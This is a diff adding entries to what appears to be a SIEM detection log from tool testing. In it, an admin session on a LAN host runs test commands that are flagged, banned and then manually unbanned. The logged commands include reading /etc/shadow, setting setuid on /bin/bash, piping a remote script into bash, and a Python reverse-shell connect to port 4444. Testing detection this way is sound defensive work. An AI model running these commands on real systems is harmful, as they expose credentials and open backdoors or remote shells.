@@ -598,3 +598,178 @@
   Summary: Network: [INTERNAL] | Target: 192.0.2.1 restriction lifted! Reason: Manual Admin Unban
   Details: Network: [INTERNAL] | Target: 192.0.2.1 restriction lifted! Reason: Manual Admin Unban
 ---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+  Details: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_SENSITIVE_FILE_READ]
+  Target: 192.168.42.190 | MITRE: T1068 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Privilege Escalation / Integrity Violation (MITRE T1068 - SYSTEM_INTEGRITY) detected from 192.168.42.190.
+  Details: Session [SESS_admin_192.168.42.190_pts_0_1787215613282]: User 'admin' executed 'cat /etc/shadow'. (Summary: Unauthorized Sensitive Credential File Read (/etc/shadow))
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.42.190 SSH isolated due to security violations.
+  Details: Target 192.168.42.190 (INTERNAL) restricted for 120 mins. Reason: Session Hostile Activity: 'cat /etc/shadow' (CRITICAL Level - Risk: 75)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+  Details: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_PRIVILEGE_ESCALATION]
+  Target: 192.168.42.190 | MITRE: T1068 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Privilege Escalation / Integrity Violation (MITRE T1068 - SYSTEM_INTEGRITY) detected from 192.168.42.190.
+  Details: Session [SESS_admin_192.168.42.190_pts_0_1787215613406]: User 'admin' executed 'sudo chmod 4755 /bin/bash'. (Summary: Privilege Elevation / GTFOBins Backdoor Manipulation)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.42.190 SSH isolated due to security violations.
+  Details: Target 192.168.42.190 (INTERNAL) restricted for 120 mins. Reason: Session Hostile Activity: 'sudo chmod 4755 /bin/bash' (CRITICAL Level - Risk: 75)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+  Details: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [WARNING ] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_UNVERIFIED_SCRIPT_PIPE]
+  Target: 192.168.42.190 | MITRE: T1190 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (99.6% Confidence) | Web Application Attack (SQLi/XSS/XXE/LFI) (MITRE T1190 - APPLICATION_EXPLOIT) detected from 192.168.42.190.
+  Details: Session [SESS_admin_192.168.42.190_pts_0_1787215613529]: User 'admin' executed 'curl -s http:/example.com/test.sh | bash'. (Summary: Unverified Remote Web Script Piped Directly into Shell)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.42.190 SSH isolated due to security violations.
+  Details: Target 192.168.42.190 (INTERNAL) restricted for 40 mins. Reason: Session Hostile Activity: 'curl -s http:/example.com/test.sh | bash' (HIGH Level - Risk: 80)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+  Details: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_INLINE_INTERPRETER_EXEC]
+  Target: 192.168.42.190 | MITRE: T1071 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Command & Control (C2) / Reverse Shell (MITRE T1071 - NETWORK_C2) detected from 192.168.42.190.
+  Details: Session [SESS_admin_192.168.42.190_pts_0_1787215613685]: User 'admin' executed 'python3 -c "import socket; s=socket.socket(); s.connect(('192.0.2.1', 4444))'. (Summary: Inline Command-Line Code String Injection Execution)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.42.190 SSH isolated due to security violations.
+  Details: Target 192.168.42.190 (INTERNAL) restricted for 120 mins. Reason: Session Hostile Activity: 'python3 -c "import socket; s=socket.socket(); s.connect(('192.0.2.1', 4444))' (CRITICAL Level - Risk: 75)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+  Details: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_INLINE_INTERPRETER_EXEC]
+  Target: 192.168.42.190 | MITRE: T1027 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (98.5% Confidence) | Obfuscated / Encoded Payload (MITRE T1027 - OBFUSCATION_EVASION) detected from 192.168.42.190.
+  Details: Session [SESS_admin_192.168.42.190_pts_0_1787215613805]: User 'admin' executed 'python3 -c "import base64; exec(base64.b64decode('cHJpbnQoIlNJRU0gVGVzdCIp'))'. (Summary: Inline Command-Line Code String Injection Execution)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.42.190 SSH isolated due to security violations.
+  Details: Target 192.168.42.190 (INTERNAL) restricted for 120 mins. Reason: Session Hostile Activity: 'python3 -c "import base64; exec(base64.b64decode('cHJpbnQoIlNJRU0gVGVzdCIp'))' (CRITICAL Level - Risk: 75)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:53] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+  Details: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:54] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_INLINE_INTERPRETER_EXEC]
+  Target: 192.168.42.190 | MITRE: T1190 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (99.5% Confidence) | Web Application Attack (SQLi/XSS/XXE/LFI) (MITRE T1190 - APPLICATION_EXPLOIT) detected from 192.168.42.190.
+  Details: Session [SESS_admin_192.168.42.190_pts_0_1787215613960]: User 'admin' executed 'python3 -c "import pty; pty.spawn('/bin/sh')'. (Summary: Inline Command-Line Code String Injection Execution)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:54] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.42.190 SSH isolated due to security violations.
+  Details: Target 192.168.42.190 (INTERNAL) restricted for 120 mins. Reason: Session Hostile Activity: 'python3 -c "import pty; pty.spawn('/bin/sh')' (CRITICAL Level - Risk: 75)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:54] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:54] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-20 11:46:54] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+  Details: User 'admin' logged in successfully. (IP: 192.168.42.190 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:54] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_REVERSE_SHELL_ATTEMPT]
+  Target: 192.168.42.190 | MITRE: T1190 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (99.4% Confidence) | Web Application Attack (SQLi/XSS/XXE/LFI) (MITRE T1190 - APPLICATION_EXPLOIT) detected from 192.168.42.190.
+  Details: Session [SESS_admin_192.168.42.190_pts_0_1787215614108]: User 'admin' executed 'mkfifo /tmp/siem_fifo_test && rm -f /tmp/siem_fifo_test'. (Summary: Outbound Reverse Shell Connection Attempt)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:54] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.42.190 SSH isolated due to security violations.
+  Details: Target 192.168.42.190 (INTERNAL) restricted for 120 mins. Reason: Session Hostile Activity: 'mkfifo /tmp/siem_fifo_test && rm -f /tmp/siem_fifo_test' (CRITICAL Level - Risk: 85)
+---------------------------------------------------------------------------
+[2026-08-20 11:46:54] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.42.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.42.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
